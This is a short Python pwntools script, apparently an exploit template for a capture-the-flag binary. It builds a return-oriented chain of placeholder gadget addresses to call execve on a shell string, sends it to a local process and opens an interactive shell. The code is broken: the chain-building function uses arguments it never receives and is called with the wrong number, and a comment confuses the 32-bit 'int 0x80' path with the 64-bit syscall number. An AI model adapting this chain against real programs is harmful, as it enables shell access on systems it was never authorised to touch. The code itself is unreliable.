
import pwn

# set architecture if necessary
pwn.context.arch = 'amd64'

# for our own syscall %rdi, %rsi, %rdx, %r10, %r8 and %r9.
pop_rax = addr_pop_rax      # syscall number
pop_rdi = addr_pop_rdi      # first parameter
pop_rsi = addr_pop_rsi      # second parameter
pop_rdx = addr_pop_rdx      # third parameter
syscall = addr_int_80       # perform syscall with "int 0x80"

def mysyscall(no, arg1):
    return [pop_rax, no,
            pop_rdi, arg1,
            pop_rsi, arg2,
            pop_rdx, arg3,
            syscall]

sh = addr_of_sh_string

proc = pwn.process("binarys")

# flat and setup syscall
payload = pwn.flat(mysyscall(0x3b, sh, 0, 0)) # 0x3b = 59 = execve

# send payload
print "payload:", repr(payload)

proc.sendline(payload)
proc.interactive()
